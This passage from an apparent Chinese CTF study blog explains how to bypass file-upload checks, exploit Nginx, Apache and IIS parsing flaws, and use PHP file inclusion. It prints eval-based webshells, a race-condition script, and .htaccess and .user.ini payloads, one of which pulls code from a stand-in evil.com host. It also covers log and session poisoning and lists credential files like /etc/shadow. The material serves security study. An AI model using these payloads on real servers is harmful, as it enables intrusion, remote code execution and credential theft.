<p>绕过方法：<br>根据实际过滤的字符来判断，（一般不会限制所有敏感字符，因为还要兼顾图片上传）</p>
<h4 id="图片二次渲染"><a href="#图片二次渲染" class="headerlink" title="图片二次渲染"></a>图片二次渲染</h4><p>检测原理：<br>后端调用了<code>php</code>的GD库，提取了文件中的图片数据，然后再重新渲染，这样图片中插入的恶意代码就会被过滤掉了</p>
<p>绕过方法：<br>比较过滤前后文件内容，一般不会全部过滤。<br>比较使用<code>php-gd</code>转换之前和之后的gif图像，并搜索它们之间的任何相似性，因此，如果我在原始文件中找到相似的部分，则在使用<code>php-gd</code>转换后也保留了该部分然后我可以在那部分注入我的PHP代码并获得RCE</p>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>该漏洞形成逻辑：<br>网站允许上传文件，然后检查上传文件是否包含<code>webshell</code>、是否是指定的文件类型。如果不是，那么删除该文件。在删除之前访问上传的<code>php</code>文件，从而执行上传文件中的<code>php</code>代码。</p>
<p>绕过方法：<br>先进行文件上传，后进行判断与删除。利用时间差进行<code>webshell</code>上传。<br>竞争条件代码举例：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($\_POST\[&quot;cmd&quot;\])?&gt;&#x27;</span>);
<span class="meta">?&gt;</span></code></pre>

<p>判断是否删除</p>
<pre><code class="highlight python"><span class="keyword">import</span> requests  
<span class="keyword">while</span> true:  
	requests.get(”路径“)</code></pre>

<h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p>当文件完全被ban，只用以图片类型上传的时候，我们该怎么办呢</p>
<h3 id="上传-htaccess文件绕过"><a href="#上传-htaccess文件绕过" class="headerlink" title="上传.htaccess文件绕过"></a>上传.htaccess文件绕过</h3><p><code>.htaccess</code>文件是一个纯文本文件，它里面存放着Apache服务器配置相关的指令。</p>
<p><code>.htaccess</code>主要的作用有：URL重写、自定义错误页面、MIME类型配置以及访问权限控制等。主要体现在伪静态的应用、图片防盗链、自定义404错误页面、阻止&#x2F;允许特定IP&#x2F;IP段、目录浏览与主页、禁止访问指定文件类型、文件密码保护等。</p>
<p><code>.htaccess</code>的用途范围主要针对当前目录</p>
<p>类似内容</p>
<pre><code class="highlight plaintext">ForceType application/x-httpd-php
SetHandler application/x-httpd-php
这些都会把上传的文件强制解析为php</code></pre>

<h3 id="上传-user-ini文件绕过"><a href="#上传-user-ini文件绕过" class="headerlink" title="上传.user.ini文件绕过"></a>上传.user.ini文件绕过</h3><p><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是<code>nginx/apache/IIS</code>，只要是以<strong>fastcgi</strong>运行的<code>php</code>都可以用这个方法。</p>
<p>那么什么是<code>.user.ini</code>？这得从<code>php.ini</code>说起了。<code>php.ini</code>是<code>php</code>默认的配置文件，其中包括了很多<code>php</code>的配置，这些配置中，又分为几种：<em>PHP_INI_SYSTEM</em>、<em>PHP_INI_PERDIR</em>、<em>PHP_INI_ALL</em>、<em>PHP_INI_USER</em>。在此可以查看：<a href="http://php.net/manual/zh/ini.list.php">http://php.net/manual/zh/ini.list.php</a> 这几种模式有什么区别？看看官方的解释：</p>
<p><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/8d6872811ad6ca771a0debab4f7a50ce.png" alt="img"></p>
<p>除了主 <code>php.ini </code>之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 <code>PHP_INI_PERDIR</code> 和 <code>PHP_INI_USER</code> 模式的 INI 设置可被识别。</p>
<p>所以除了<code>PHP_INI_SYSTEM</code>以外的模式（包括<code>PHP_INI_ALL</code>）都是可以通过<code>.user.ini</code>来设置的。我们可以很容易地借助<code>.user.ini</code>文件，更改<code>auto_prepend_file</code>配置项，来构造一个“后门”。</p>
<p>比如，某网站限制不允许上传<code>.php</code>文件，你便可以上传一个<code>.user.ini</code>，再上传一个图片马，包含起来进行<code>getshell</code>。不过前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件，否则也不能包含了。再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
<p>实例([SUCTF 2019]CheckIn1):</p>
<pre><code class="highlight javascript">$userdir = <span class="string">&quot;uploads/&quot;</span> . <span class="title function_">md5</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);
<span class="keyword">if</span> (!<span class="title function_">file_exists</span>($userdir)) &#123;
    <span class="title function_">mkdir</span>($userdir, <span class="number">0777</span>, <span class="literal">true</span>);
&#125;
<span class="title function_">file_put_contents</span>($userdir . <span class="string">&quot;/index.php&quot;</span>, <span class="string">&quot;&quot;</span>);
<span class="keyword">if</span> (<span class="title function_">isset</span>($_POST[<span class="string">&quot;upload&quot;</span>])) &#123;
    $tmp_name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];
    $name = $_FILES[<span class="string">&quot;fileUpload&quot;</span>][<span class="string">&quot;name&quot;</span>];
    <span class="keyword">if</span> (!$tmp_name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filesize too big!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (!$name) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;filename cannot be empty!&quot;</span>);
    &#125;
    $extension = <span class="title function_">substr</span>($name, <span class="title function_">strrpos</span>($name, <span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);
    <span class="keyword">if</span> (<span class="title function_">preg_match</span>(<span class="string">&quot;/ph|htaccess/i&quot;</span>, $extension)) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;illegal suffix!&quot;</span>);
    &#125;
    <span class="keyword">if</span> (<span class="title function_">mb_strpos</span>(<span class="title function_">file_get_contents</span>($tmp_name), <span class="string">&quot;&lt;?&quot;</span>) !== <span class="variable constant_">FALSE</span>) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;&amp;lt;? in contents!&quot;</span>);
    &#125;
    $image_type = <span class="title function_">exif_imagetype</span>($tmp_name);
    <span class="keyword">if</span> (!$image_type) &#123;
        <span class="title function_">die</span>(<span class="string">&quot;exif_imagetype:not image!&quot;</span>);
    &#125;
    $upload_file_path = $userdir . <span class="string">&quot;/&quot;</span> . $name;
    <span class="title function_">move_uploaded_file</span>($tmp_name, $upload_file_path);
    echo <span class="string">&quot;Your dir &quot;</span> . $userdir. <span class="string">&#x27; &lt;br&gt;&#x27;</span>;
    echo <span class="string">&#x27;Your files : &lt;br&gt;&#x27;</span>;
    <span class="title function_">var_dump</span>(<span class="title function_">scandir</span>($userdir));
&#125;</code></pre>

<p><strong>绕过技巧</strong>：</p>
<p>1.针对过滤包含<code>ph</code>与<code>htaccess</code>扩展名的文件：上传<code>.user.ini</code>与图片马，利用<code>.user.ini</code>进行文件包含2.针对过滤文件内容包含<code>&lt;?</code>的文件：使用<code>php</code>的脚本标记风格<code>&lt;script language=&#39;php&#39;&gt;</code>3.针对使用<code>exif_imagetype</code>规定了必须为图片类型的文件：添加文件头内容或合成图片马（稍后会讲）</p>
<p>首先上传<code>.user.ini</code>文件，文件内容为：</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
auto_prepend_file=shell.<span class="property">png</span></code></pre>

<p>然后构造一个<code>shell.png</code>，内容如下：</p>
<pre><code class="highlight javascript"><span class="title class_">GIF89</span>a
&lt;script language=<span class="string">&#x27;php&#x27;</span>&gt; @<span class="built_in">eval</span>($_POST[<span class="string">&#x27;hack&#x27;</span>]); &lt;/script&gt;</code></pre>

<p>然后将两个文件分别上传到服务器上，拿到回显</p>
<h3 id="奇奇怪怪的绕过"><a href="#奇奇怪怪的绕过" class="headerlink" title="奇奇怪怪的绕过"></a>奇奇怪怪的绕过</h3><p>利用一下文件包含上传一个压缩包来getshell</p>
<p>这里不细讲</p>
<h2 id="Ngnix解析漏洞"><a href="#Ngnix解析漏洞" class="headerlink" title="Ngnix解析漏洞"></a>Ngnix解析漏洞</h2><h3 id="文件解析漏洞"><a href="#文件解析漏洞" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h3><p>对于任意文件名，在后面添加<code>/abc.php</code>(abc为任意字符)后，即可将文件作为php解析</p>
<p><strong>漏洞机理</strong></p>
<p>Nginx配置导致，而非nginx版本问题，而取决于php的配置文件 php.ini 文件中是否开启了<code> cgi.fix_pathinfo</code></p>
<p>当访问<code>xxx.jpg/abc.php</code>时，nginx查看URL后发现以php结尾，并将路径传递给<code>phpfastcgi</code>处理程序，php看到<code>xxx.jpg/abc.php</code>不存在，便删除去最后的<code>/abc.php</code>，看到<code>xxx.jpg</code>存在，而后以<code>php</code>的形式执行<code>xxx.jpg</code>的内容</p>
<p>大概的来说，就是<code>cgi.fix_pathinfo</code>会对形如<code>/1.aaa/2.bbb/3.cccc</code>的文件路径进行处理，若该路径不存在，则会去掉最后的子路径再次判断直到找到一个存在的路径。</p>
<p>若关闭该选项，访问<code>/xxx.jpg/abc.php</code>会返回找不到文件，但关闭该选项可能会导致一些其他错误，所以默认开启。</p>
<p>在高版本中，引入了<code>security.limit_extensions</code>来纠正这个错误，限制了可执行文件的后缀，默认只允许执行<code>.php</code>文件。防止这一问题(回显Access denied)</p>
<h3 id="空字节RCE"><a href="#空字节RCE" class="headerlink" title="空字节RCE"></a>空字节RCE</h3><p>Nginx在遇到%00空字节时与后段<code>FastCGI</code>处理不一致，导致可以在图中嵌入PHP代码然后通过访问<code>1.jpg%00.php</code>来执行其中的代码。</p>
<p><strong>影响版本</strong></p>
<pre><code class="highlight plaintext">nginx 0.5.*
nginx 0.6.*
nginx 0.7 &lt;= 0.7.65
nginx 0.8 &lt;= 0.8.37</code></pre>

<p>该漏洞不受cgi.fix_pathinfo影响，当为0时，依旧可以解析</p>
<h3 id="CVE-2013-4547-20-00"><a href="#CVE-2013-4547-20-00" class="headerlink" title="CVE-2013-4547(%20%00)"></a>CVE-2013-4547(%20%00)</h3><p><strong>影响版本</strong></p>
<pre><code class="highlight plaintext">nginx 0.8.41 ~ 1.5.6</code></pre>

<p>原理是非法字符空格和截止符（%00）会导致Nginx解析URI时的有限状态机混乱，危害是允许攻击者通过一个非编码空格绕过后缀名限制。是什么意思呢？举个例子，假设服务器上存在文件：“file.jpg ”，注意文件名的最后一个字符是空格。则可以通过访问：<code>http://127.0.0.1/file.jpg \0.php</code> </p>
<p>让Nginx认为文件“file.jpg ”的后缀为<code>.php</code></p>
<p>来测试下，这次测试在Nginx&#x2F;1.0.15中进行。首先准备一张图片，命名为“test.html ”，注意，文件名含有空格。然后在浏览器中访问该文件，会得到一个404，因为浏览器自动将空格编码为%20，服务器中不存在文件“test.html%20”。</p>
<p>测试目标是要让Nginx认为该文件是图片文件并正确地在浏览器中显示出来。我们想要的是未经编码的空格和截止符（\0），怎么办呢？使用Burp Suite抓取浏览器发出的请求包，修改为我们想要的样子，原本的URL是：<code>http://192.168.56.101/test.htmlAAAjpg </code>,将第一个“A”改成“20”（空格符号的ASCII码），将第二个“A”改成“00”（截止符），将第三个“A”改成“2e”（“.”的ASCII码），如图<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194656774-1403436835.png" alt="1964477-20200308194656774-1403436835"></p>
<p>修改完毕后Forward该请求，在浏览器中看到：</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194716298-1059932045.png" alt="1964477-20200308194716298-1059932045"></p>
<p>我们已经成功地利用了漏洞！但这有什么用呢？我们想要的是代码被执行。</p>
<p>继续测试，准备文件“test.jpg ”，注意文件名的最后一个字符是空格，上传到服务器。文件内容为：</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></code></pre>

<p>用Burp Suite抓包并修改，原本的URL是：<code>http://192.168.56.101/test.jpg…php</code> ,将jpg后的第一个“.”改为20，第二个“.”改为00，如下图所示</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/1964477-20200308194746793-602361880.png" alt="1964477-20200308194746793-602361880"></p>
<p>修改完毕后 Forword 该请求，在浏览器中看到：Access denied ，好吧，又是这个。</p>
<p>这说明Nginx在接收到这一请求后，确实把文件“test.jpg ”当做php文件交给php去执行了，只是php看到该文件后缀为“.jpg ”而拒绝执行。这样，便验证了Nginx确实存在该漏洞。但是由于<code>security.limit_extensions</code>的存在，导致我们并不能利用此漏洞</p>
<h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="文件名解析漏洞"><a href="#文件名解析漏洞" class="headerlink" title="文件名解析漏洞"></a>文件名解析漏洞</h3><p><code>Apache</code>从右向左判断解析文件,若无法解析再继续向左判断,如<code>1.php.owf.rar</code>这个文件名，<code>Apache</code>无法解析<code>.owf</code>和<code>.rar</code>两个后缀，于是继续向前解析将其解析为1.php</p>
<p>实际上许多后缀都可以被解析为php文件进行处理，这里贴一下其他师傅的文章</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250417211410728.png" alt="image-20250417211410728"></p>
<pre><code class="highlight plaintext">原链接:https://www.cnblogs.com/yokan/p/12444476.html
可以用shell.php/x.php/..绕</code></pre>

<h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>是Apache下的一个配置文件，负责相关目录下的网页配置。通过<code> .htaccess</code>文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在 <code>httpd.conf</code> 文件中配置。</p>
<pre><code class="highlight plaintext">生效前提:
AllowOverride被启用/AllowOverride Options FileInfo
mod_rewrite 模块开启
cgi_module被加载。即apache配置文件中有LoadModule cgi_module modules/mod_cgi.so这么一句且没有被注释</code></pre>

<p>这里放几个常用的配置</p>
<h4 id><a href="#" class="headerlink" title></a></h4><pre><code class="highlight plaintext">AddType application/x-httpd-php .jpg</code></pre>

<p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析</p>
<h4 id="CGI启动方式利用"><a href="#CGI启动方式利用" class="headerlink" title="CGI启动方式利用"></a>CGI启动方式利用</h4><pre><code class="highlight plaintext">Options ExecCGI (表示允许CGI执行，若AllowOverride只有FileInfo权限且本身就开启了ExecCGI的话，就可以不需要这句话了。)
AddHandler cgi-script .xx(将.xx后缀的文件当成CGI程序解析)
#AddHandler application/x-httpd-php .php (给php后缀增加了处理器，这样即使有多个后缀，只要含有php后缀就会被识别为php文件)</code></pre>

<p>下面是网上一个师傅的利用</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083343333.png" alt="image-20250418083343333"></p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250418083404184.png" alt="image-20250418083404184"></p>
<h4 id="FastCGI利用"><a href="#FastCGI利用" class="headerlink" title="FastCGI利用"></a>FastCGI利用</h4><p>依赖<code>mod_fcgid.so</code>，默认安装包里是没有这个so文件的，但是在PHPstudy的默认配置中是已经加载了的，并且<code>AllowOverrride</code>也是All权限</p>
<pre><code class="highlight plaintext">Options +ExecCGI
AddHandler fcgid-script .gif
FcgidWrapper &quot;/bin/bash&quot; .gif</code></pre>

<h4 id="文件包含利用"><a href="#文件包含利用" class="headerlink" title="文件包含利用"></a>文件包含利用</h4><p><code>php_value auto_prepend_file +文件绝对路径</code>（默认是当前上传的目录）</p>
<p>预先包含我们指定的文件</p>
<pre><code class="highlight plaintext">php_flag allow_url_include 1
php_value auto_append_file data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==
#php_value auto_append_file data://text/plain,%3C%3Fphp+phpinfo%28%29%3B
#php_value auto_append_file https://evil.com/evil-code.txt</code></pre>

<p>如果若我们预先包含.htaccess文件呢?效果是我们插入的恶意代码就会被任意包含</p>
<p>大概像这样构造</p>
<pre><code class="highlight plaintext">php_value auto_prepend_file &quot;.htaccess&quot;%0a#&lt;?php phpinfo();?&gt;</code></pre>

<p>同时这个漏洞也可以造成xss漏洞和其他的一些文件包含漏洞</p>
<h4 id="正经写入"><a href="#正经写入" class="headerlink" title="正经写入"></a>正经写入</h4><pre><code class="highlight plaintext">#
&lt;IfModule mime_module&gt;
AddHandler php5-script .gif          #在当前目录下，只针对gif文件会解析成Php代码执行
SetHandler application/x-httpd-php    #在当前目录下，所有文件都会被解析成php代码执行
&lt;/IfModule&gt;

#
&lt;FilesMatch &quot;evil.gif&quot;&gt;
SetHandler application/x-httpd-php   #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
AddHandler php5-script .gif          #在当前目录下，如果匹配到evil.gif文件，则被解析成PHP代码执行
&lt;/FilesMatch&gt;
较为精准，不容易误伤
这边看到还有个写法:
&lt;FilesMatch   &quot;shell&quot;&gt; 
SetHandler  application/x-httpd-php 
&lt;/FilesMatch&gt; (意思是把文件名中含shell的都当作php解析，包括还有一个正则的写法)

#
&lt;IfModule mime_module&gt;
AddType application/x-httpd-php .gif (将.gif文件按照php代码进行解析执行)
AddHandler php5-script .jpg	(将.jpg文件按照php代码进行解析执行)
Sethandler application/x-httpd-php (将该目录及子目录下的文件均按照php文件解析执行)
&lt;/IfModule&gt;
容易误伤</code></pre>

<h3 id="CVE-2017-15715"><a href="#CVE-2017-15715" class="headerlink" title="CVE-2017-15715"></a>CVE-2017-15715</h3><p>在文件后缀后加上<code>%0a</code>，绕过getshell</p>
<h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>配置 <code>Options +Indexes</code> 时Apache存在目录遍历漏洞。</p>
<h3 id="lighttpd"><a href="#lighttpd" class="headerlink" title="lighttpd"></a>lighttpd</h3><p><code>xx.jpg/xx.php</code></p>
<h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="解析目录解析漏洞-test-asp-1-jpg"><a href="#解析目录解析漏洞-test-asp-1-jpg" class="headerlink" title="解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)"></a>解析目录解析漏洞(&#x2F;test.asp&#x2F;1.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中，在网站下建立文件夹的名字为<code>*.asp、*.asa、*.cer、*.cdx </code>的文件夹，那么其目录内的任何扩展名的文件都会被IIS当做asp文件来解释并执行。例如创建目录 test.asp，那么 &#x2F;test.asp&#x2F;1.jpg 将被当做asp文件来执行。假设黑客可以控制上传文件夹路径，就可以不管上传后你的图片改不改名都能拿shell了</p>
<h3 id="文件名解析漏洞-test-asp-jpg"><a href="#文件名解析漏洞-test-asp-jpg" class="headerlink" title="文件名解析漏洞(test.asp;.jpg)"></a>文件名解析漏洞(test.asp;.jpg)</h3><p>在 IIS5.x&#x2F;6.0 中， 分号后面的不被解析，也就是说 xie.asp;.jpg 会被服务器看成是xie.asp。还有IIS6.0默认的可执行文件除了asp还包含这两种 <code>.asa  .cer</code> 。而有些网站对用户上传的文件进行校验，只是校验其后缀名。所以我们只要上传 <code>*.asp;.jpg、*.asa;.jpg、*.cer;.jpg</code> 后缀的文件，就可以通过服务器校验，并且服务器会把它当成asp文件执行。</p>
<h3 id="畸形解析漏洞-test-jpg-php"><a href="#畸形解析漏洞-test-jpg-php" class="headerlink" title="畸形解析漏洞(test.jpg&#x2F;*.php)"></a>畸形解析漏洞(test.jpg&#x2F;*.php)</h3><p>微软发布了IIS7.0修补了IIS6.0的解析漏洞，没想到IIS7.0爆出更严重的畸形解析漏洞，于是微软急忙发布了IIS7.5</p>
<p>在 IIS7.0中，在默认Fast-CGI开启状况下，我们往图片里面写入下面的代码</p>
<p> <a href="https://img2020.cnblogs.com/i-beta/1964477/202003/1964477-20200308194604304-1865593941.png"><img src="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/kisakiayano/source/_posts/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1964477-20200308194604304-1865593941.png" alt="img"></a></p>
<p>将文件保存成test.jpg格式，上传到服务器，假设上传路径为&#x2F;upload，上传成功后，直接访问&#x2F;upload&#x2F;test.jpg&#x2F;x.php，此时神奇的畸形解析开始发挥作用啦。test.jpg将会被服务器当成php文件执行，所以图片里面的代码就会被执行。我们会神奇的发现在 &#x2F;upload 目录下创建了一个一句话木马文件<code> shell.php</code> 。</p>
<p>临时解决办法：设置<code> cgi.fix_pathinfo</code>为0&#96;</p>
<h3 id="其他解析漏洞"><a href="#其他解析漏洞" class="headerlink" title="其他解析漏洞"></a><strong>其他解析漏洞</strong></h3><p>在windows环境下，**xx.jpg[**<strong>空格]</strong> 或 <strong>xx.jpg.</strong> 这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点，黑客可以通过抓包，在文件名后加一个空格或者点绕过黑名单。若上传成功，空格和点都会被windows自动消除。</p>
<p>同时推荐一篇比较有意思的文章，lz自己没怎么看懂，但是感觉蛮有意思的</p>
<p><a href="https://rivers.chaitin.cn/blog/cqr0pg10lne22g7e74ig">Black Hat USA 2024：利用Apache HTTP服务器中隐藏的语义歧义进行攻击！ | 长亭百川云</a></p>
]]></content>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h1><p>依赖于<code>include()</code>,<code>require()</code>,<code>include_once()</code>,<code>require_once()</code>这些函数的漏洞</p>
<p>什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含</p>
<p>有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。</p>
<p><strong>#</strong> <strong>几个函数的区别</strong></p>
<p>require():找不到被包含的文件会产生致命错误，并停止脚本运行<br>include():找不到被包含的文件只会产生警告，脚本继续执行<br>require_once()与require()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含<br>include_once()与include()类似:唯一的区别是如果该文件的代码已经被包含，则不会再次包含</p>
<p>只要文件中存在<code>php</code>代码都会被解析出来</p>
<h2 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h2><p>能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)<br>测试网页包含如下代码:</p>
<pre><code class="highlight php"><span class="meta">&lt;?php</span>
	<span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];
	<span class="keyword">include</span>(<span class="variable">$file</span>);
<span class="meta">?&gt;</span></code></pre>

<p>网站利用文件包含功能读取一些<code>php</code>文件，例如<code>phpinfo</code>:</p>
<p>也可以包含木马</p>
<p>利用该代码，我们可以读取一些系统本地的敏感信息。<br>例如:<code>C:\Windows\system.ini</code>文件。<br>（1）使用绝对路径<br>使用绝对路径直接读取:</p>
<p>（2）使用相对路径进行读取<br>通过.&#x2F;表示当前位置路径，<code>../</code>表示上一级路径位置，在linux中同样适用。</p>
<p>例如当前页面所在路径为<code>C:\Apache24\htdocs\</code>，我们需要使用…&#x2F;退到C盘再进行访问，构造路径如下：<br><code>../../windows/system.ini</code></p>
<p>由于我的环境搭建在D盘，所以这里就不做演示了。</p>
<p>（3）一些常见的敏感目录信息路径:<br>Windows系统:</p>
<pre><code class="highlight plaintext">C:\boot.ini //查看系统版本
C:\windows\system32\inetsrv\MetaBase.xml //IIS配置文件
C:\windows\repair\sam //存储Windows系统初次安装的密码
C:\ProgramFiles\mysql\my.ini //Mysql配置
C:\ProgramFiles\mysql\data\mysql\user.MYD //MySQL root密码
C:\windows\php.ini //php配置信息
Linux/Unix系统:

/etc/password //账户信息
/etc/shadow //账户密码信息
/usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件
/usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置
/usr/local/app/php5/lib/php.ini //PHP相关配置
/etc/httpd/conf/httpd.conf //Apache配置文件
/etc/my.conf //mysql配置文件</code></pre>

<p>三、LFI漏洞利用技巧<br>1.配合文件上传使用<br>有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。</p>
<p>以DVWA平台为例，将Security Level选择low，编辑一个图片马，内容如下:</p>
<pre><code class="highlight plaintext">&lt;?php
	fwrite(fopen(&quot;shell.php&quot;,&quot;w&quot;),&#x27;&lt;?php eval($_POST[123]);?&gt;);
?&gt;</code></pre>

<p>找到上传点进行上传：</p>
<p>得到文件保存的完整路径</p>
<p>现在我们利用页面去执行我们上传的图片马</p>
<p>有能够读取文件的php页面，直接构造url读取，代码成功解析</p>
<p>注：我们也可以直接在webshell.jpg中写一句话木马，然后再通过文件包含漏洞去连接webshell.jpg，但这种方法有时候webshell功能会出现异常。所以我们选择上面的方式，生成一个.php格式的一句话木马，再去连接。</p>
<p>2.包含Apache日志文件<br>有时候网站存在文件包含漏洞，但是却没有文件上传点。这个时候我们还可以通过利用Apache的日志文件来生成一句话木马。</p>
<p>在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:</p>
<p>当我们正常访问一个网页时，如&#96;<a href="http://127.0.0.1/phpinfo.php%EF%BC%8Caccess%E6%97%A5%E5%BF%97%E4%BC%9A%E8%BF%9B%E8%A1%8C%E8%AE%B0%E5%BD%95%EF%BC%8C%E5%A6%82%E4%B8%8B%E5%9B%BE%E6%89%80%E7%A4%BA">http://127.0.0.1/phpinfo.php，access日志会进行记录，如下图所示</a>:</p>
<p>如果我们访问一个不存在的资源，也一样会进行记录，例如访问</p>
<pre><code class="highlight plaintext">127.0.0.1&lt;?php phpinfo();?&gt;</code></pre>

<p>网页会显示403</p>
<p>但查看日志会发现被成功记录但被编码了</p>
<p>我们再次进行访问，并使用burp抓包，发现被编码：</p>
<p>我们将报文修改回去，再进行发送即可：</p>
<p>此时再查看access日志，正确写入php代码：</p>
<p>再通过本地文件包含漏洞访问，即可执行</p>
<p>我们可以在此处写入一句话木马，再使用webshell管理工具进行连接。</p>
<p>3.包含SESSION文件<br>可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。</p>
<p>利用条件:</p>
<p>找到Session内的可控变量<br>Session文件可读写，并且知道存储路径<br>php的session文件的保存路径可以在phpinfo的session.save_path看到。</p>
<p>session常见存储路径:</p>
<p>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sess_PHPSESSID<br>&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID<br>session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。<br>相关案例可以查看这道CTF题一道CTF题：PHP文件包含</p>
<p>4.包含临时文件</p>
<p>php中上传文件，会创建临时文件。在linux下使用&#x2F;tmp目录，而在windows下使用C:\windows\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。</p>
<p>由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。</p>
<p>另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。</p>
<p>这个方法可以参考LFI With PHPInfo Assistance<br>类似利用临时文件的存在，竞争时间去包含的，可以看看这道CTF题： XMAN夏令营-2017-babyweb-writeup</p>
<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><h2 id="必备知识-php伪协议"><a href="#必备知识-php伪协议" class="headerlink" title="必备知识:php伪协议"></a>必备知识:php伪协议</h2><h3 id="file-协议"><a href="#file-协议" class="headerlink" title="file:// 协议"></a><code>file://</code> 协议</h3><ul>
<li><p><strong>条件</strong>：</p>
<ul>
<li><code>allow_url_fopen</code>:off&#x2F;on</li>
<li><code>allow_url_include</code> :off&#x2F;on</li>
</ul>
</li>
<li><p><strong>作用</strong>：<br>用于访问本地文件系统，在CTF中通常用来<strong>读取本地文件</strong>的且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br><code>include()/require()/include_once()/require_once()</code>参数可控的情况下，如导入为非<code>.php</code>文件，则仍按照php语法进行解析，这是<code>include()</code>函数所决定的。</p>
</li>
